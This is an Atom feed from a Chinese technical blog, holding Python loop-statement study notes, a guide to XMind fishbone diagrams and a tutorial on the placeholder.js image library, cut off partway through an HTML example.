<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>芳草地</title>
  
  <subtitle>叶绍亭的技术博客</subtitle>
  <link href="http://yeshaoting.cn/atom.xml" rel="self"/>
  
  <link href="http://yeshaoting.cn/"/>
  <updated>2021-07-01T04:25:32.000Z</updated>
  <id>http://yeshaoting.cn/</id>
  
  <author>
    <name>yeshaoting</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python菜鸟教程学习笔记 - 循环语句</title>
    <link href="http://yeshaoting.cn/article/python/Python%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/"/>
    <id>http://yeshaoting.cn/article/python/Python%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/</id>
    <published>2021-07-01T04:25:32.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/python.png" title="python" class="img-logo img-center" /><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>程序在一般情况下是按顺序执行的。<br>编程语言提供了各种控制结构，允许更复杂的执行路径。<br>本章要介绍的循环语句，允许我们执行一个语句或语句组多次。</p><h3 id="1-循环类型"><a href="#1-循环类型" class="headerlink" title="1. 循环类型"></a>1. 循环类型</h3><table><thead><tr><th>循环类型</th><th>描述</th></tr></thead><tbody><tr><td>while循环</td><td>在给定的判断条件为 true 时执行循环体，否则退出循环体。</td></tr><tr><td>for循环</td><td>重复执行语句</td></tr><tr><td>嵌套循环</td><td>你可以在while循环体中嵌套for循环</td></tr></tbody></table><h3 id="2-循环控制"><a href="#2-循环控制" class="headerlink" title="2. 循环控制"></a>2. 循环控制</h3><table><thead><tr><th>控制语句</th><th>描述</th></tr></thead><tbody><tr><td>break 语句</td><td>在语句块执行过程中终止循环，并且跳出整个循环。</td></tr><tr><td>continue 语句</td><td>在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。</td></tr><tr><td>pass 语句</td><td>pass是空语句，是为了保持程序结构的完整性。</td></tr></tbody></table><h2 id="二、while循环"><a href="#二、while循环" class="headerlink" title="二、while循环"></a>二、while循环</h2><p>Python 编程中 while 语句用于循环执行程序，即在某条件下，循环执行某段程序，以处理需要重复处理的相同任务。</p><h3 id="1-语法格式"><a href="#1-语法格式" class="headerlink" title="1. 语法格式"></a>1. 语法格式</h3><blockquote><p>while 判断条件：<br>    执行语句……</p></blockquote><h3 id="2-实例"><a href="#2-实例" class="headerlink" title="2. 实例"></a>2. 实例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">9</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;The count is :&#x27;</span>, count</span><br><span class="line">    count = count + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Good bye!&quot;</span></span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="3-输出结果"><a href="#3-输出结果" class="headerlink" title="3. 输出结果"></a>3. 输出结果</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:loop yeshaoting$ python while.py</span><br><span class="line">The count is : 0</span><br><span class="line">The count is : 1</span><br><span class="line">The count is : 2</span><br><span class="line">The count is : 3</span><br><span class="line">The count is : 4</span><br><span class="line">The count is : 5</span><br><span class="line">The count is : 6</span><br><span class="line">The count is : 7</span><br><span class="line">The count is : 8</span><br><span class="line">Good <span class="built_in">bye</span>!</span><br></pre></td></tr></table></figure><h2 id="三、for循环"><a href="#三、for循环" class="headerlink" title="三、for循环"></a>三、for循环</h2><p>Python for循环可以遍历任何序列的项目，如一个列表或者一个字符串。</p><h3 id="1-语法格式-1"><a href="#1-语法格式-1" class="headerlink" title="1. 语法格式"></a>1. 语法格式</h3><blockquote><p>for iterating_var in sequence:<br>   statements(s)</p></blockquote><h3 id="2-实例-1"><a href="#2-实例-1" class="headerlink" title="2. 实例"></a>2. 实例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"></span><br><span class="line">string = <span class="string">&#x27;Python&#x27;</span></span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> string:</span><br><span class="line">    <span class="built_in">print</span> letter;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)):</span><br><span class="line">    <span class="built_in">print</span> letter;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fruits = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;mango&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> fruit <span class="keyword">in</span> fruits:</span><br><span class="line">    <span class="built_in">print</span> fruit;</span><br></pre></td></tr></table></figure><h3 id="3-扩展知识"><a href="#3-扩展知识" class="headerlink" title="3. 扩展知识"></a>3. 扩展知识</h3><h4 id="内置函数len"><a href="#内置函数len" class="headerlink" title="内置函数len"></a>内置函数len</h4><p>返回序列(string, bytes, tuple, list, range)长度。</p><blockquote><p>Return the length (the number of items) of an object. The argument may be a sequence (such as a string, bytes, tuple, list, or range) or a collection (such as a dictionary, set, or frozen set).</p></blockquote><h4 id="内置函数range"><a href="#内置函数range" class="headerlink" title="内置函数range"></a>内置函数range</h4><p>range返回一个序列的数。</p><p>有两种用法：<br>range(stop)<br>range(start, stop[, step])</p><h3 id="4-输出结果"><a href="#4-输出结果" class="headerlink" title="4. 输出结果"></a>4. 输出结果</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:loop yeshaoting$ python for.py</span><br><span class="line">P</span><br><span class="line">y</span><br><span class="line">t</span><br><span class="line">h</span><br><span class="line">o</span><br><span class="line">n</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">apple</span><br><span class="line">mango</span><br><span class="line">banana</span><br></pre></td></tr></table></figure><h2 id="四、嵌套循环"><a href="#四、嵌套循环" class="headerlink" title="四、嵌套循环"></a>四、嵌套循环</h2><p>Python 语言允许在一个循环体里面嵌入另一个循环。</p><h2 id="五、循环控制"><a href="#五、循环控制" class="headerlink" title="五、循环控制"></a>五、循环控制</h2><p>break语句用来终止循环语句，即循环条件没有False条件或者序列还没被完全递归完，也会停止执行循环语句。<br>continue 语句用来告诉Python跳过当前循环的剩余语句，然后继续进行下一轮循环。<br>pass 不做任何事情，一般用做占位语句。</p><h2 id="六、参考文档"><a href="#六、参考文档" class="headerlink" title="六、参考文档"></a>六、参考文档</h2><ul><li><a href="http://www.runoob.com//python/python-loops.html">Python 循环语句</a></li><li><a href="http://www.runoob.com//python/python-while-loop.html">Python While循环语句</a></li><li><a href="http://www.runoob.com//python/python-for-loop.html">Python for 循环语句</a></li><li><a href="http://www.runoob.com//python/python-nested-loops.html">Python 循环嵌套</a></li><li><a href="http://www.runoob.com//python/python-break-statement.html">Python break 语句</a></li><li><a href="http://www.runoob.com//python/python-continue-statement.html">Python continue  语句</a></li><li><a href="http://www.runoob.com//python/python-pass-statement.html">Python pass 语句</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/python.png&quot; title=&quot;python&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、概述&quot;&gt;&lt;a href=&quot;#一、概述&quot; class=&quot;headerlink&quot; title=&quot;一、概述&quot;&gt;&lt;/a&gt;一、概述&lt;/h2&gt;&lt;p&gt;程序在一般情况下是按顺序执行的。&lt;br&gt;编程语言提供了各种控制结构，允许更复杂的执行路径。&lt;br&gt;本章要介绍的循环语句，允许我们执行一个语句或语句组多次。&lt;/p&gt;
&lt;h3 id=&quot;1-循环类型&quot;&gt;&lt;a href=&quot;#1-循环类型&quot; class=&quot;headerlink&quot; title=&quot;1. 循环类型&quot;&gt;&lt;/a&gt;1. 循环类型&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;循环类型&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;while循环&lt;/td&gt;
&lt;td&gt;在给定的判断条件为 true 时执行循环体，否则退出循环体。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;for循环&lt;/td&gt;
&lt;td&gt;重复执行语句&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;嵌套循环&lt;/td&gt;
&lt;td&gt;你可以在while循环体中嵌套for循环&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&quot;2-循环控制&quot;&gt;&lt;a href=&quot;#2-循环控制&quot; class=&quot;headerlink&quot; title=&quot;2. 循环控制&quot;&gt;&lt;/a&gt;2. 循环控制&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;控制语句&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;break 语句&lt;/td&gt;
&lt;td&gt;在语句块执行过程中终止循环，并且跳出整个循环。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;continue 语句&lt;/td&gt;
&lt;td&gt;在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;pass 语句&lt;/td&gt;
&lt;td&gt;pass是空语句，是为了保持程序结构的完整性。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id=&quot;二、while循环&quot;&gt;&lt;a href=&quot;#二、while循环&quot; class=&quot;headerlink&quot; title=&quot;二、while循环&quot;&gt;&lt;/a&gt;二、while循环&lt;/h2&gt;&lt;p&gt;Python 编程中 while 语句用于循环执行程序，即在某条件下，循环执行某段程序，以处理需要重复处理的相同任务。&lt;/p&gt;
&lt;h3 id=&quot;1-语法格式&quot;&gt;&lt;a href=&quot;#1-语法格式&quot; class=&quot;headerlink&quot; title=&quot;1. 语法格式&quot;&gt;&lt;/a&gt;1. 语法格式&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;while 判断条件：&lt;br&gt;    执行语句……&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;2-实例&quot;&gt;&lt;a href=&quot;#2-实例&quot; class=&quot;headerlink&quot; title=&quot;2. 实例&quot;&gt;&lt;/a&gt;2. 实例&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#!/usr/bin/env python&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#coding=utf8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;count = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; count &amp;lt; &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;The count is :&amp;#x27;&lt;/span&gt;, count&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    count = count + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;Good bye!&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="系统脚本" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="python" scheme="http://yeshaoting.cn/tags/python/"/>
    
    <category term="学习笔记" scheme="http://yeshaoting.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>如何使用xmind鱼骨头</title>
    <link href="http://yeshaoting.cn/article/soft/tools/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8xmind%E9%B1%BC%E9%AA%A8%E5%A4%B4/"/>
    <id>http://yeshaoting.cn/article/soft/tools/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8xmind%E9%B1%BC%E9%AA%A8%E5%A4%B4/</id>
    <published>2017-01-17T10:40:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>鱼骨图因常常被用于问题的分析以及解决方法，所以又被称为因果图。</p><h2 id="二、使用方式"><a href="#二、使用方式" class="headerlink" title="二、使用方式"></a>二、使用方式</h2><p>可以通过模板创建鱼骨头：</p><p><img src="http://www.xmindchina.net/uploads/images/support/yugutu-muban150703.png" alt="模板创建xmind鱼骨头"></p><p>也可以通过调整思维导图结构来实现鱼骨头：</p><p><img src="http://www.xmindchina.net/uploads/images/support/yugutu-jiegou150703.png" alt="思维导图结构调整"></p><h2 id="三、分析类型"><a href="#三、分析类型" class="headerlink" title="三、分析类型"></a>三、分析类型</h2><p>鱼骨头通过有两种类型：原因分析型和对策分析型。</p><h3 id="1-原因分析型"><a href="#1-原因分析型" class="headerlink" title="1. 原因分析型"></a>1. 原因分析型</h3><p>鱼头向右</p><p>针对分析“为什么”这类问题。</p><h3 id="2-对策分析型"><a href="#2-对策分析型" class="headerlink" title="2. 对策分析型"></a>2. 对策分析型</h3><p>鱼头向左</p><p>针对分析“如何、怎样”类型的问题。</p><h2 id="四、应用实例"><a href="#四、应用实例" class="headerlink" title="四、应用实例"></a>四、应用实例</h2><h3 id="1-原因分析型实例"><a href="#1-原因分析型实例" class="headerlink" title="1. 原因分析型实例"></a>1. 原因分析型实例</h3><p><img src="http://ocszqgifn.bkt.clouddn.com/meituan/%E9%B1%BC%E9%AA%A8%E5%A4%B4%E6%A1%88%E4%BE%8B-%E7%BA%BF%E4%B8%8A%E6%9C%8D%E5%8A%A1%E5%BC%82%E5%B8%B8.png" alt="鱼骨头案例-线上服务异常"></p><h3 id="2-对策分析型实例"><a href="#2-对策分析型实例" class="headerlink" title="2. 对策分析型实例"></a>2. 对策分析型实例</h3><p><img src="http://ocszqgifn.bkt.clouddn.com/meituan/%E9%B1%BC%E9%AA%A8%E5%A4%B4%E6%A1%88%E4%BE%8B-2017%E5%B9%B4%E5%BA%A6%E8%AE%A1%E5%88%92.png" alt="鱼骨头案例-2017年度计划"></p><h2 id="五、参考文档"><a href="#五、参考文档" class="headerlink" title="五、参考文档"></a>五、参考文档</h2><ul><li><a href="http://www.xmindchina.net/jiqiao/xmind-huizhi-yugutu.html">如何绘制XMind的拿手好戏—鱼骨图</a></li><li><a href="http://www.xmindchina.net/xinwen/yugu-fenxi.html">思维导图之鱼骨图</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、概述&quot;&gt;&lt;a href=&quot;#一、概述&quot; class=&quot;headerlink&quot; title=&quot;一、概述&quot;&gt;&lt;/a&gt;一、概述&lt;/h2&gt;&lt;p&gt;鱼骨图因常常被用于问题的分析以及解决方法，所以又被称为因果图。&lt;/p&gt;
&lt;h2 id=&quot;二、使用方式&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="软素质" scheme="http://yeshaoting.cn/categories/%E8%BD%AF%E7%B4%A0%E8%B4%A8/"/>
    
    
    <category term="思维脑图" scheme="http://yeshaoting.cn/tags/%E6%80%9D%E7%BB%B4%E8%84%91%E5%9B%BE/"/>
    
  </entry>
  
  <entry>
    <title>图片占位符placeholder.js</title>
    <link href="http://yeshaoting.cn/article/js/%E5%9B%BE%E7%89%87%E5%8D%A0%E4%BD%8D%E7%AC%A6placeholder.js/"/>
    <id>http://yeshaoting.cn/article/js/%E5%9B%BE%E7%89%87%E5%8D%A0%E4%BD%8D%E7%AC%A6placeholder.js/</id>
    <published>2016-12-30T08:40:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>图片占位符，图片由于诸如过大导致浏览器渲染慢、服务器端响应时间过长、页面需要加载的图片过多等原因导致图片未加载。<br>某些图片未成功渲染场景下，希望页面结构能大致保持不变。</p><p><strong>注：</strong> 同类型的先驱：<a href="http://holderjs.com/">http://holderjs.com/</a><br>由于当前placeholder.js已经满足需求，因此暂不对比更加广泛使用的holderjs</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>placeholder.js是一款轻量级的可在浏览器端生成占位图片的javascript库插件。该图片占位插件大小小于1kb，不依赖于任何js框架，并提供完善的配置参数和简单的方法。</p><h2 id="二、使用步骤"><a href="#二、使用步骤" class="headerlink" title="二、使用步骤"></a>二、使用步骤</h2><h3 id="1-引用类库"><a href="#1-引用类库" class="headerlink" title="1. 引用类库"></a>1. 引用类库</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://cdn.bootcss.com/placeholder.js/3.1.0/placeholder.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="2-使用方法"><a href="#2-使用方法" class="headerlink" title="2. 使用方法"></a>2. 使用方法</h3><h4 id="Programmatic-use-API-to-process-image-placeholder-getData-opts"><a href="#Programmatic-use-API-to-process-image-placeholder-getData-opts" class="headerlink" title="Programmatic use API to process image: placeholder.getData(opts)"></a>Programmatic use API to process image: placeholder.getData(opts)</h4><p>通过js程序设置图片src内容。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;img_holder&#x27;</span>).setAttribute(<span class="string">&#x27;src&#x27;</span>, <span class="built_in">window</span>.placeholder.getData(opts));</span><br></pre></td></tr></table></figure><h4 id="Image-onerror-event"><a href="#Image-onerror-event" class="headerlink" title="Image onerror event"></a>Image onerror event</h4><p>在img标签上添加onerror监听事件。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onerror=&quot;this.src=placeholder.getData(&#123;size: &#x27;256x128&#x27;, text: &#x27;Image 404&#x27;&#125;)&quot;</span><br></pre></td></tr></table></figure><h4 id="Use-image-config-attribute"><a href="#Use-image-config-attribute" class="headerlink" title="Use image config attribute."></a>Use image config attribute.</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;placeholder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">options</span>=<span class="string">&quot;size=256x128&amp;text=Hello!&quot;</span> <span class="attr">class</span>=<span class="string">&quot;placeholder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">options</span>=<span class="string">&quot;size=256x128&amp;text=Hello%2525%26%3DWorld&quot;</span> <span class="attr">class</span>=<span class="string">&quot;placeholder&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这种方式，有几点使用注意事项：</p><ul><li>需要在所有img标签后添加渲染语句<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="comment">// 使用第3类方式需要，执行此方法</span></span><br><span class="line">placeholder.render()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li>options内text值需要做encodeURIComponent</li><li>img标签必须包含名为placeholder的class属性值</li></ul><h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>placeholder实例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://cdn.bootcss.com/placeholder.js/3.1.0/placeholder.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>1. Programmatic use API to process image: placeholder.getData(opts)<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">pre</span>&gt;</span>document.getElementById(&#x27;img_holder&#x27;).setAttribute(&#x27;src&#x27;, window.placeholder.getData(opts));<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;img_holder&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> opts = &#123;</span></span><br><span class="line"><span class="javascript">    <span class="attr">size</span>: <span class="string">&#x27;256x128&#x27;</span>,</span></span><br><span class="line"><span class="javascript">    <span class="attr">font</span>: &#123;</span></span><br><span class="line"><span class="javascript">      <span class="attr">style</span>: <span class="string">&#x27;oblique&#x27;</span>,</span></span><br><span class="line"><span class="javascript">    &#125;,</span></span><br><span class="line"><span class="javascript">    <span class="attr">text</span>: <span class="string">&#x27;Hello World&#x27;</span></span></span><br><span class="line"><span class="javascript">  &#125;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;img_holder&#x27;</span>).setAttribute(<span class="string">&#x27;src&#x27;</span>, <span class="built_in">window</span>.placeholder.getData(opts));</span></span><br><span class="line"><span class="javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>2. Image onerror event<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">pre</span>&gt;</span>onerror=&quot;this.src=placeholder.getData(&#123;size: &#x27;256x128&#x27;, text: &#x27;Image 404&#x27;&#125;)&quot;<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;img_holder2&quot;</span> <span class="attr">src</span>=<span class="string">&quot;404.png&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;this.src=placeholder.getData(&#123;size: &#x27;256x128&#x27;, text: &#x27;Image 404&#x27;&#125;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>3. Use image config attribute.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="symbol">&amp;lt;</span>img class=&quot;placeholder&quot;<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;placeholder&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="symbol">&amp;lt;</span>img options=&quot;size=256x128&amp;text=Hello!&quot; class=&quot;placeholder&quot;<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span 